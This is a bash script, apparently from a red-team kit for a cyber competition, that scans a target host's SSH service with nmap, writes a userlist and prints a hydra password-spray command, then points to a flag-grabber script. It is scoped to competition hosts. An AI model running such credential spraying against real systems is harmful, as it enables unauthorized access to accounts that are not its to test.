#!/usr/bin/env bash
# ============================================================
# 06_ssh_peashooter.sh — target: peashooter.misty.view (.54)
# Debian 12. Scored service: SSH.
# ============================================================
# Usage:
#   TARGET_TEAM=07 ./06_ssh_peashooter.sh
#
# Requires: nmap, hydra (or medusa)
# ============================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./scope.env

TARGET="$HOST_PEASHOOTER"
assert_in_scope "$TARGET"
OUT="$OUTDIR/ssh_peashooter"
mkdir -p "$OUT"

echo "=== SSH recon: $TARGET ==="
nmap -Pn -sV -p22 --script ssh2-enum-algos,ssh-auth-methods "$TARGET" -oN "$OUT/ssh_scan.txt"
cat "$OUT/ssh_scan.txt"

printf "%s\n" "${USERS_PEASHOOTER[@]}" > "$OUT/userlist.txt"
echo "[*] Userlist written: user, tanglekelp, hypnoshroom, root"

cat <<'EOF'

[*] Credential spray — keep it to a short list (default/released comp
    creds first, a handful of classic weak passwords second). Don't
    run a giant rockyou-style list against a shared competition host;
    it's slow, noisy, and against the spirit of the exercise.

    hydra -L OUT/userlist.txt -P ./wordlists/comp_default_creds.txt \
          -t 4 ssh://TARGET

[*] Once you land a shell, go straight to the flag grabber:
    ./07_flag_grabber.sh ssh TARGET USERNAME

EOF

echo "=== Done. Review $OUT/ ==="
